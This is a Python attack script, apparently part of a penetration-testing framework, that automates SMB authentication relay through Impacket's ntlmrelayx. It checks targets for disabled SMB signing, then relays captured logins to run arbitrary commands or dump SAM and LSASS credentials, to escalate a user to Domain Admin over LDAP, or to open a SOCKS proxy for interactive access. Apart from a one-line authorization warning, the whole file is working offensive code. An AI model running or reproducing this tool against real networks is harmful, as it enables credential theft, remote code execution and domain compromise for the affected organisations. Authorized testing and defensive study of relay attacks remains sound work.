#!/usr/bin/env python3
"""
SMB Relay Attack - Automated SMB Authentication Relay
Captures and relays SMB authentication to compromise targets

WARNING: Active attack. Use only with explicit authorization.
"""

import sys
import os
import argparse
import subprocess
import time
from datetime import datetime

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.database import DatabaseManager
from core.logger import setup_logger, get_logger

logger = None

class SMBRelayAttack:
    """SMB authentication relay using Impacket"""
    
    def __init__(self, targets, session_dir):
        self.targets = targets if isinstance(targets, list) else [targets]
        self.session_dir = session_dir
        self.ntlmrelayx_path = self._find_ntlmrelayx()
    
    def _find_ntlmrelayx(self):
        """Locate ntlmrelayx from Impacket"""
        try:
            result = subprocess.run(['which', 'ntlmrelayx.py'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass
        
        logger.error("ntlmrelayx not found")
        logger.error("Install: pip3 install impacket")
        return None
    
    def disable_smb_signing_check(self):
        """Check if SMB signing is disabled on targets"""
        logger.info("Checking SMB signing status on targets...")
        
        vulnerable_targets = []
        
        for target in self.targets:
            try:
                # Use nmap to check SMB signing
                result = subprocess.run(
                    ['nmap', '-p445', '--script', 'smb-security-mode', target],
                    capture_output=True, text=True, timeout=30
                )
                
                if 'message_signing: disabled' in result.stdout.lower():
                    logger.warning(f"✅ {target} - SMB signing DISABLED (vulnerable)")
                    vulnerable_targets.append(target)
                else:
                    logger.info(f"❌ {target} - SMB signing enabled (not vulnerable)")
                    
            except subprocess.TimeoutExpired:
                logger.warning(f"Timeout checking {target}")
            except Exception as e:
                logger.error(f"Error checking {target}: {e}")
        
        return vulnerable_targets
    
    def run_smb_relay_to_smb(self, command=None):
        """
        Execute SMB to SMB relay
        
        Args:
            command: Optional command to execute on target
        """
        if not self.ntlmrelayx_path:
            return False
        
        logger.info("=" * 60)
        logger.info("SMB Relay Attack - SMB to SMB")
        logger.info("=" * 60)
        
        # Check for vulnerable targets
        vulnerable = self.disable_smb_signing_check()
        
        if not vulnerable:
            logger.error("No targets with SMB signing disabled found")
            logger.error("SMB relay requires SMB signing to be disabled")
            return False
        
        # Create target file
        target_file = os.path.join(self.session_dir, 'smb_relay_targets.txt')
        with open(target_file, 'w') as f:
            for target in vulnerable:
                f.write(f"{target}\n")
        
        logger.info(f"Vulnerable targets: {len(vulnerable)}")
        logger.info(f"Target file: {target_file}")
        
        # Build command
        cmd = [
            'python3', self.ntlmrelayx_path,
            '-tf', target_file,
            '-smb2support'
        ]
        
        if command:
            cmd.extend(['-c', command])
            logger.info(f"Command to execute: {command}")
        else:
            # Default actions
            cmd.append('--dump-sam')
            cmd.append('--dump-lsass')
            logger.info("Default: Dump SAM and LSASS")
        
        # Output directory
        output_dir = os.path.join(self.session_dir, 'smb_relay_output')
        os.makedirs(output_dir, exist_ok=True)
        
        logger.info(f"Command: {' '.join(cmd)}")
        logger.warning("⚠️  SMB relay attack starting...")
        logger.warning("⚠️  Trigger with: dir \\\\<attacker-ip>\\share")
        
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Monitor output
            while True:
                line = process.stdout.readline()
                if not line:
                    break
                
                line = line.strip()
                logger.info(f"[ntlmrelayx] {line}")
                
                # Highlight important events
                if any(keyword in line.lower() for keyword in 
                      ['authenticating', 'authenticated', 'dumping', 'executed']):
                    logger.warning(f"🎯 {line}")
            
            process.wait()
            return True
            
        except KeyboardInterrupt:
            logger.warning("SMB relay interrupted")
            process.terminate()
            return False
        except Exception as e:
            logger.error(f"SMB relay failed: {e}")
            return False
    
    def run_smb_relay_to_ldap(self, domain_controller):
        """
        Execute SMB to LDAP relay for privilege escalation
        
        Args:
            domain_controller: DC IP for LDAP relay
        """
        if not self.ntlmrelayx_path:
            return False
        
        logger.info("=" * 60)
        logger.info("SMB Relay Attack - SMB to LDAP")
        logger.info("=" * 60)
        logger.info(f"Target DC: {domain_controller}")
        logger.info("Goal: Create domain admin account")
        
        cmd = [
            'python3', self.ntlmrelayx_path,
            '-t', f'ldap://{domain_controller}',
            '-smb2support',
            '--escalate-user', 'relayuser',  # User to escalate
            '--add-computer'  # Add computer account
        ]
        
        logger.info(f"Command: {' '.join(cmd)}")
        logger.warning("⚠️  SMB to LDAP relay starting...")
        logger.warning("⚠️  Will escalate 'relayuser' to Domain Admin")
        
        try:
            subprocess.run(cmd, timeout=600)  # 10 minute timeout
            return True
        except subprocess.TimeoutExpired:
            logger.info("LDAP relay timed out")
            return False
        except Exception as e:
            logger.error(f"LDAP relay failed: {e}")
            return False
    
    def run_smb_relay_with_socks(self):
        """Run SMB relay with SOCKS proxy for interactive access"""
        if not self.ntlmrelayx_path:
            return False
        
        logger.info("=" * 60)
        logger.info("SMB Relay with SOCKS Proxy")
        logger.info("=" * 60)
        logger.info("This creates a SOCKS proxy for interactive access")
        
        target_file = os.path.join(self.session_dir, 'smb_relay_targets.txt')
        with open(target_file, 'w') as f:
            for target in self.targets:
                f.write(f"{target}\n")
        
        cmd = [
            'python3', self.ntlmrelayx_path,
            '-tf', target_file,
            '-smb2support',
            '-socks'  # Enable SOCKS proxy
        ]
        
        logger.info(f"Command: {' '.join(cmd)}")
        logger.info("SOCKS proxy will listen on: 127.0.0.1:1080")
        logger.info("Use with: proxychains <command>")
        logger.warning("⚠️  SMB relay with SOCKS starting...")
        
        try:
            subprocess.run(cmd)
            return True
        except KeyboardInterrupt:
            logger.warning("SOCKS relay interrupted")
            return False
        except Exception as e:
            logger.error(f"SOCKS relay failed: {e}")
            return False


def main(session_dir, targets, mode='smb', dc=None, command=None):
    """Main SMB relay execution"""
    global logger
    
    setup_logger("smb_relay", session_dir)
    logger = get_logger("smb_relay")
    
    # Check for root
    if os.geteuid() != 0:
        logger.error("SMB relay requires root privileges")
        return
    
    logger.info("=" * 60)
    logger.info("SMB Relay Attack Framework")
    logger.info("=" * 60)
    
    # Initialize
    relay = SMBRelayAttack(targets, session_dir)
    
    # Execute based on mode
    if mode == 'smb':
        success = relay.run_smb_relay_to_smb(command=command)
    elif mode == 'ldap':
        if not dc:
            logger.error("LDAP mode requires --dc parameter")
            return
        success = relay.run_smb_relay_to_ldap(dc)
    elif mode == 'socks':
        success = relay.run_smb_relay_with_socks()
    else:
        logger.error(f"Unknown mode: {mode}")
        return
    
    if success:
        logger.info("✅ SMB relay attack complete")
    else:
        logger.error("SMB relay attack failed")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="SMB Relay Attack Framework"
    )
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--targets", required=True, help="Comma-separated target IPs")
    parser.add_argument("--mode", choices=['smb', 'ldap', 'socks'], default='smb')
    parser.add_argument("--dc", help="Domain Controller IP (for LDAP mode)")
    parser.add_argument("--command", help="Command to execute on relay")
    
    args = parser.parse_args()
    
    targets = args.targets.split(',')
    main(args.session_dir, targets, args.mode, args.dc, args.command)
